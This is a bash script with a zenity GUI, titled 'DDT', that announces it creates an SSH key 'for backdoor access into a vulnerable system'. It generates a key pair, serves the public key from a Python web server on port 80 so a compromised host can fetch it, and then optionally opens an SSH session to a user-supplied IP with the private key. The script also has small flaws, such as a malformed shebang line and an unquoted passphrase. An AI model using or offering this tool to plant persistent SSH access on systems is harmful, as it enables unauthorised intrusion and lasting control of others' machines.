#/bin/bash
echo This script will create an SSH key for backdoor access into a vulnerable system

Filename=$(zenity --entry --text "Please Enter Desired Filename (A-Z only)" --title "DDT"); #Prompts user to create a filename

while true
do
  if [[ -z "$Filename" ]]
    then zenity --error --width 300 --text "Please Enter A Valid Filename"
    Filename=$(zenity --entry --text "Please Enter Desired Filename (A-Z only)" --title "DDT");
  else
    break
  fi
done

echo $Filename "Was Selected"

Password=$(zenity --entry --text "Please Enter Your Desired SSH-KEY Passphrase" --title "DDT" --entry-text="" --hide-text);
# slightly modified https://www.howtogeek.com/435020/how-to-add-a-gui-to-linux-shell-scripts/ to not show password text for security purposes
while true
do
  if [[ -z "$Password" ]]
    then zenity --error --width 300 --text "Please Enter A Valid Passphrase"
    Password=$(zenity --entry --text "Please Enter Your Desired SSH-KEY Passphrase" --title "DDT" --entry-text="" --hide-text);
  else
    break
  fi
done

ssh-keygen -t rsa -N $Password -f $Filename
# using the variables, the key pair is created

mkdir $Filename"-Key"
mv $Filename.pub $Filename"-Key"
cd $Filename"-Key"
ls -l

# The above code creates a new directory in which the public key will reside in
# This is done so that when the web server is hosted, only the public key can be accessed
# for security purposes.
check=$(zenity --question --text "Do you want to host the public-key" --title "DDT";)
if [[ $? -eq 0 ]]
  then ipaddress=$(hostname -I) #grab the current IP address
  tmux new -d -s Web #create an external terminal to host the web server
  tmux send-keys -t Web.0 "python3 -m http.server 80"
  tmux send-keys -t Web.0 Enter
  #run web server and send "enter" key

  Response=$(zenity --info --text "

  Web Server is hosted on: http:// $ipaddress Click OK to stop the Web Server"  --width 300 --height 127);
  # Create the info popup box with the URL to the server.
  echo $Response
  #Prompts the User if they want to manually ssh
  #After they have stopped the Web Server
  ssh=$(zenity --question --text "Do you want to manually ssh?" --title "DDT")
  if [[ $? -eq 0 ]]
    then username=$(zenity --entry --text "Please Enter username: (e.g. root)" --title "DDT") # Asks for Username
    location=$(zenity --entry --text "Please Enter IP address (e.g. 192.168.1.1)" --title "DDT") # Asks for IP address
    cd ..
    tmux new -d -s ssh #Creates a new session
    tmux send-keys -t ssh.0 "ssh -i $Filename $username@$location" #ssh into the server
    tmux send-keys -t ssh.0 Enter #Enters command above
    tmux a -t ssh #Displays SSH in a tmux terminal
  else
    echo "Bye"
  fi
fi

 if [ $? -eq 0 ]
  then tmux kill-session
 fi
